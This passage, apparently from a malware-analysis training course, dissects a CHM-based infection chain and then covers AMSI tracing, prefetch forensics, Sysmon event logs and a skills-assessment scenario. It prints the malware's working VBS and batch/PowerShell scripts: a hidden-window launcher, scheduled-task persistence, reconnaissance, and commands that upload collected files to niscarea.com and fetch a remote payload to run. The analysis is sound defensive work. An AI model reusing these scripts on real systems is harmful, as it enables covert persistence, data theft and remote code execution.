The contents of the `emlmanager.vbs` script, dumped into the user's Libraries directory as discussed before, are shown below. Using the WMI classes `Win32_ProcessStartup` and `Win32_Process`, the batch file `2034923` is executed. The instruction `plnr.ShowWindow = 0` sets the window to be hidden so the batch file is executed without the user's knowledge.

```vba

Set fyhn = GetObject("winmgmts:win32_ProcessStartup")
Set plrn = fyhn.SpawnInstance_
plrn.ShowWindow = 0
uhex = Left(WScript.ScriptFullName, InstrRev(WScript.ScriptFullName, "\") - 1)
Set axju = GetObject("winmgmts:win32_process")
sbbrd = axju.Create(uhex & "\2034923.bat", Null, plrn, pid)
Set axju = Nothing
Set plrn = Nothing
Set fyhn = Nothing

```

#### Analyzing 2034923.bat

The contents of `2034923.bat` are shown below. There is a comment "Rubick's 2034923" in the bat file. The special variable " `%~dp0`" is used to fetch the absolute path, in our case, the public user Libraries directory ( `C:\Users\Public\Libraries`). First, it checks for a scheduled task with name SafeBrowsing. If it is not found, a new scheduled task is created using the schtasks command with name SafeBrowsing.

The `/sc` switch defines the schedule type in minutes, and the `/mo` switch is set to 2, which indicates that the system will execute this task every 2 minutes. Finally, the `/tr` switch is set to our `emlmanager.vbs` in the user's Library directory.

After creating the task, it proceeds to execute the `9583423.bat` file if it is present in the working directory. Following this activity, it executes two other scripts, `4959032.bat` and `5923924.bat`, by passing " `https[:]//niscarea[.]com`" as first argument.

```batch

@echo off
rem Rubick's 2034923
pushd "%~dp0"
schtasks /query /tn "SafeBrowsing" > nul
if %ERRORLEVEL% equ 0 (goto NORMAL) else (goto REGISTER)
:REGISTER
schtasks /create /sc minute /mo 2 /tn "SafeBrowsing" /tr "%~dp0emlmanager.vbs" /f > nul
:NORMAL
if exist "9583423.bat" (
	call 9583423.bat > nul
	del /f /q 9583423.bat > nul
)
set r=https://niscarea.com
call 4959032.bat %r% > nul
call 5923924.bat %r% > nul

```

#### Analyzing 9583423.bat

The script `9583423.bat` is basically used for reconnaissance purposes. The script executes three commands - `systeminfo`, `tasklist`, and `dir`. The output of these commands is redirected to files `sys.txt`, `tsklt.txt`, `desk.txt`, and `down.txt`. These files can be found in `C:\Users\Public\Libraries` directory.

```batch

@echo off
pushd "%~dp0"
systeminfo > %~dp0sys.txt
timeout -t 1 /nobreak
tasklist > %~dp0tsklt.txt
timeout -t 1 /nobreak
dir "C:\Users\%username%\Desktop" /a/o-d/s > %~dp0desk.txt
timeout -t 1 /nobreak
dir "C:\Users\%username%\Downloads" /a/o-d/s > %~dp0down.txt
timeout -t 1 /nobreak
set l=https://niscarea.com
call 1295049.bat %l% "%~dp0sys.txt" >nul
timeout -t 1 /nobreak
call 1295049.bat %l% "%~dp0tsklt.txt" >nul
timeout -t 1 /nobreak
call 1295049.bat %l% "%~dp0desk.txt" >nul
timeout -t 1 /nobreak
call 1295049.bat %l% "%~dp0down.txt" >nul
timeout -t 1 /nobreak

```

The contents of the above-mentioned files will contain the result of the `systeminfo` and `tasklist` commands, as well a file listing of downloads directory.

#### Analyzing 1295049.bat

The script calls `9583423.bat` four times, and passing the domain name " `https[:]//niscarea[.]com`" and the files `sys.txt`, `tsklt.txt`, `desk.txt` and `down.txt` to `9583423.bat` in each call.

The batch script mentioned in the snippet below shows the contents of the `9583423.bat` script. It invokes PowerShell with the execution policy bypass. The `Add-Type` instructs the PowerShell to load .NET assemblies into current PowerShell session. It loads the `System.IO.Compression.FileSystem` assembly and then initializes few variables: `$l`, `$f`, `$r`, `$r`, `$c`, `$a`, `$a`, `$e` with " `https[:]//niscarea[.]com`", a file (e.g., `sys.txt`), date and time, a base64 encoded string of computer name, a user agent string, appends `.zip` and `.enc` to filename, respectively.

The variable `$h` holds an object of `System.IO.Compression.ZipFile` class, this is used to create a zip file from the file (e.g. `sys.txt`). The zipped file is finally shipped to adversary-controlled server by creating a special URL `https[:]//niscarea[.]com/in[.]php?cn=<base64_encoded_computer_name_string>&fn=<DataTime>`. The file upload operation is performed by creating an object of `System.Net.WebClient` class and calling `UploadFile` method in the class.

```batch

@echo off
pushd %~dp0
set "l=%~1"
set "f=%~2"
set n=3
powershell -ep bypass -command "Add-Type -AssemblyName System.IO.Compression.FileSystem;
$l='%l%';
$f='%f%';
$r=[DateTime]::Now.ToString('MM-dd HH-mm-ss');
$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));
$a='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)';
$z=$f+'.zip';
$e=$f+'.enc';
Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf('\')+1);
$h=[System.IO.Compression.ZipFile]::Open($z,'Create');[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();
$b=Get-Content $z -Encoding Byte -Raw;
[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;
Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+'/in.php?cn='+$c+'&fn='+$r;
$w=New-Object System.Net.WebClient;
$w.Headers.Add('User-Agent',$a);
$w.UploadFile($u,$e);
Remove-Item $e -Force;"

```

#### Analyzing 4959032.bat

The `4959032.bat` script crafts a link `https[:]//niscarea[.]com/?cn=<base64_encoded_computer_name_string>` and uploads a string with the value "ok".

```batch

@echo off
rem == Hello EveryOne ==
pushd %~dp0
set "l=%~1"
powershell -ep bypass -command "$l='%l%';
$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));
$a='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)';
$u=$l+'/?cn='+$c;
$w=New-Object System.Net.WebClient;
$w.Headers.Add('User-Agent',$a);
$r=$w.UploadString($u,'ok')"

```

#### Analyzing 5923924.bat

The script `5923924.bat` is more interesting as it downloads additional files from the attacker's server. It calls `3059602.bat` by passing the domain `https[:]//niscarea[.]com` and `alo293n20so.zip` to the script. This script is responsible for carrying out the next stages, possibly executing Konni malware on target system.

```batch

@echo off
pushd %~dp0
set "l=%~1"
set fn=alo293n20so
set n=5
del /f /q run.bat > nul
call 3059602.bat %l% "%~dp0%fn%.zip" > nul
if not exist "run.bat" (goto END)
call run.bat > nul
del /f /q run.bat > nul
:END

```

#### Analyzing 3059602.bat

The script `3059602.bat` is a downloader that downloads a zipped file from `https://niscarea.com/out.php?cn=<base64_encoded_computer_name_string>`. The downloaded file is renamed to `alo293n20so.zip`, and the contents are extracted on disk. The previous script `5923924.bat`, calls this script, `3059602.bat` and following this call, there is a call to `run.bat`. Unfortunately, the server is down at the time of performing this analysis, so we can assume the unzipped contents contain a `run.bat` that will execute the next stages in the execution.

```batch

@echo off
pushd %~dp0
set "l=%~1"
set "f=%~2"
set n=4
powershell -ep bypass -command "Add-Type -AssemblyName System.IO.Compression.FileSystem;
$l='%l%';
$f='%f%';
$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));
$a='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)';
$u=$l+'/out.php?cn='+$c;
$r=(Invoke-RestMethod -uri $u -UserAgent $a);
if ($r.Length -gt 32)
{
	Remove-Item $f -Force;
	$b=[Convert]::FromBase64String($r);
	[System.IO.File]::WriteAllBytes($f,$b);
	$h=[System.IO.Compression.ZipFile]::OpenRead($f);
	foreach ($e in $h.Entries){[System.IO.Compression.ZipFileExtensions]::ExtractToFile($e,$e.FullName,$true);}
	$h.Dispose();Remove-Item $f -Force;
}"

```

### Dynamic Analysis

Before running the file, we performed some steps on the isolated VM:

- The `internet` has been turned `off` on the VM which is isolated from the network.
- `Sysmon`, `Powershell`, and `AMSI` Monitoring are running.
- A snapshot of the latest working state is taken so that we can revert back to the normal condition after performing the analysis.

If we run the `.chm` file, it looks like this (as shown in the screenshot below):

![CHM](3uMjDO3WYMY6.png)

The screenshot below shows the dropped files:

![CHM](wUg2aCWxJTQI.png)

The screenshot below shows the created scheduled task:

![CHM](hwHvwZNxUTxG.png)

The screenshot below shows that four new files are created:

![CHM](Pb1JGoJ9xdPs.png)

* * *


# Detections and Forensics

## AMSI Monitoring

The AMSI monitoring can be performed by starting a trace:

```powershell

# Start AMSI Trace
PS C:\Tools\AMSI> logman start AMSITrace -p Microsoft-Antimalware-Scan-Interface Event1 -o AMSITrace.etl -ets

# Do your malicious things here that would be logged by AMSI

#Stop trace
PS C:\Tools\AMSI> logman stop AMSITrace -ets

#Retrieve script contents from the TRACE FILE using the script
PS C:\Tools\AMSI> .\AMSIScriptContentRetrieval.ps1 | more

```

The script contents are captured in the AMSI data:

![CHM](X6w7336YKvok.png)

On a network level, it tries to connect to `niscarea[.]com`.

## Forensics Evidence

When this activity occurs, it also generates the prefetch [files](https://docs.velociraptor.app/artifact_references/pages/windows.forensics.prefetch/) on the machine.

![CHM](UVcErv2rLwml.png)

Eric Zimmerman provides a tool for prefetch files called `PECmd`, which is available at `C:\Tools\EZ-Tools\PECmd.exe`.

`PECmd` will analyze the prefetch file (.pf) and display various information about the application's execution. This generally includes details such as:

- First and last execution timestamps.
- Number of times the application has been executed.
- Volume and directory information.
- Application name and path.
- File information, such as file size and hash values.

Let's see what happens by providing a path to a single prefetch file, for example, the prefetch file related to `hh.exe`.

![CHM](CWm3SkeDfu7x.png)

Upon scrolling down the output, we can see the directories referenced by the executable.

![CHM](9ShU5dgg9UuN.png)

Further scrolling down the output reveals the files referenced by the executable, i.e., `hh.exe`.

![CHM](bdeJaHAHA1jc.png)

Similarly, the files referenced by the `powershell.exe` are as follows:

![CHM](HVJHV1cvE7ZV.png)

For easier analysis, we can also convert the prefetch data into CSV as follows:

![CHM](rBNmUOXkVjF3.png)

The destination directory contains the parsed output in CSV format.

![CHM](M1VJYAY0BY7X.png)

Now, we can easily analyze the output in Timeline Explorer. The first output file contains all the details related to the last run, including files and directories referenced, and so on. The second output file is the timeline file, which shows the executable details sorted by runtime.

![CHM](v4OuvQ2MkcEJ.png)

This can also be checked quickly through the GUI tool [WinPrefetchView](https://www.nirsoft.net/utils/win_prefetch_view.html). You just need to open the tool, and it'll automatically fetch, parse, and display all prefetch data.

![CHM](c1MLQgPiw7Ex.png)

## Detections in Event Logs

When we start with the first event log, it shows when the process was created. In this example, `explorer.exe` (PID 1012) started `hh.exe` (PID 3620), which is the HTML Help [executable](https://lolbas-project.github.io/lolbas/Binaries/Hh/).

![CHM](LGTJ6woImUou.png)

After that, the process `hh.exe` (PID 3620) loads many DLLs. One of them is `urlmon.dll`, which handles various internet-related tasks, such as downloading files.

![CHM](2VJusavCSmfD.png)

There is suspicious activity where `hh.exe` created another instance of itself with the `-decompile` flag to decompile the CHM file inside the public location `C:\Users\Public\Libraries`, likely trying to leverage a location that is accessible to all users on the system.

![CHM](T9vEKSsxXhlv.png)

There is another suspicious file-drop activity (Sysmon event ID 11) where files are dropped in `C:\Users\Public\Libraries`.

![CHM](zNohfSrYNYpc.png)

The execution of a VBS file is captured in process creation event logs.

![CHM](8I3UBZCQKqVD.png)

The creation of `cscript.exe` is captured in process creation event logs.

![CHM](lfloziFWWn5D.png)

Next, we see WMI-related DLLs loaded by `cscript.exe`.

![CHM](5MDu84gzekLA.png)

At this point, we know that the VBS script is using the WMI class `Win32_ProcessStratup` and `Win32_process` to execute the bat file `2034923.bat`. The instruction `plrn.ShowWindow = 0` sets the window to be hidden so the batch file is executed without user's knowledge. However, an event log will be generated.

![CHM](ntvgdd9HUoEM.png)

A new process `WmiPrvSE.exe` (PID 3164), launched `cmd.exe` (PID 4364) to run `2034923.bat`:

![CHM](1on4gnY6Nftp.png)

This process `cmd.exe` (PID 4364), executed `2034923.bat`, which in turn executed `schtasks.exe` to query for a scheduled task with name "SafeBrowsing":

![CHM](6pj9CsCpmTUh.png)

Then `schtasks.exe` (PID 2976), created by `cmd.exe` (PID 4364), proceeds to create a scheduled task "SafeBrowsing", which executes the `emlmanager.vbs` script.

![CHM](sVPtlTfnO0Va.png)

Scheduled task creation also creates artifacts on the disk.

![CHM](yl9q2xTBLMoQ.png)

The process `cmd.exe` (PID 4364) also created multiple `.txt` files.

![CHM](Ng6GSff1RQKt.png)

This process `cmd.exe` (PID 4364) has also launched new process `systeminfo.exe` (PID 4672) through the batch file.

![CHM](pYgBnQgQ2QrH.png)

If we check the batch file, it calls another `.bat` file to run `systeminfo.exe` and stores the output in the `sys.txt` file.

![CHM](KCjhhFCWFOc1.png)

Here, the command [pushd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/pushd) stores the current directory for use. In batch files, the special variable " `%~dp0`" is used to fetch the absolute path, in our case, the public user's Libraries directory ( `C:\Users\Public\Libraries`) where `d` is for drive letter, `p` is for path. The text files will be saved in this path.

Then, there are multiple events of `timeout.exe` being executed from the batch file.

![CHM](r2o6kLwylbqv.png)

Similarly, the process `cmd.exe` (PID 4364) also launched `tasklist.exe` (PID 1168) to create the `tsklt.txt` file.

![CHM](apbGuxaZdHpB.png)

Similarly, the file created to store the output of the directory listing will also be logged.

![CHM](0BwbagwoGtjC.png)

Then, we can see that `cmd.exe` (PID 4364) launched `powershell.exe` (PID 1240) from the batch file.

![CHM](LT36ztuT2ab6.png)

PowerShell activity can also be tracked in the PowerShell Logs.

![CHM](S6gm6726JB35.png)

PowerShell Transcription is also enabled on the system. This means that a transcript file is created containing all the commands that are entered. This allows us to go back and audit the PowerShell activity, providing a forensic record of how PowerShell was used.

![CHM](R4zVsusuYBQI.png)

These text files are then converted to `.enc` by PowerShell.

![CHM](sIESZsxZOQDj.png)

This happens for all other text files as well. Then, a new PowerShell process is started with PID 4676.

![CHM](tDkuBoqkTW2h.png)

It queries for the DNS hostname of the attacker-controlled server.

![CHM](Kr5FDsVwkuZU.png)


# Skills Assessment - Maldoc Analysis

## Scenario

Our client, `Corp Studios`, a rapidly growing IT services and consulting firm, recently became the target of a coordinated, multi-phase cyberattack. Known for their innovative tech solutions, they had only recently established a small Security Operations Center (SOC) with a limited budget and entry-level security tools. The company’s clients include high-profile corporations, making it an attractive target for attackers. The SOC was still maturing, relying on basic antivirus and some email filtering solutions but lacking advanced threat detection.

The incident began when an employee in the HR department received an email with the subject line "Annual Employee Benefits Update". The email appeared legitimate, with the client's branding and contact details matching those of a known partner. The screenshot below shows the Word document labeled `Benefits2024.doc`, which, upon opening, prompted the employee to enable macros to view `restricted content`. Unknown to the employee, the macro execution triggered a malicious payload, giving attackers their first foothold in `Corp Studios`'s network.

![assessment](DF5ImnUKMUkQ.png)

Simultaneously, a project manager received an email related to "New Project Kick-off Resources" from what seemed to be a client contact. This email had a malicious RTF attachment, `Project_Outline.doc`, which was opened in an unpatched version of Office. This executed a hidden payload upon opening, initiating the second phase of the attack.

With these two entry points, the attackers began deploying additional tools, spreading XLL files in network drives shared among departments to maintain persistence and avoid detection. They also used CHM files (disguised as legitimate help files) containing scripts that triggered additional commands to download further payloads. These techniques allowed the attackers to spread laterally and remain concealed.

The SOC team was alerted to the compromise when they noticed unusual network traffic but lacked sufficient details. Suspicious attachments were flagged, and an investigation team was called in to investigate.

### Your Mission as the Analyst

You are working with the lead investigator assigned to analyze the incident, uncover Indicators of Compromise (IoCs), and determine the extent of the damage. Your task is to dissect each of the malicious files involved and identify macro and other embedded payloads. Based on your analysis, please provide answers to the specific questions mentioned at the bottom of this section.

* * *

Within the target (VM), you can locate the malicious samples at the following paths:

- `C:\Tools\MalDoc\assessment`


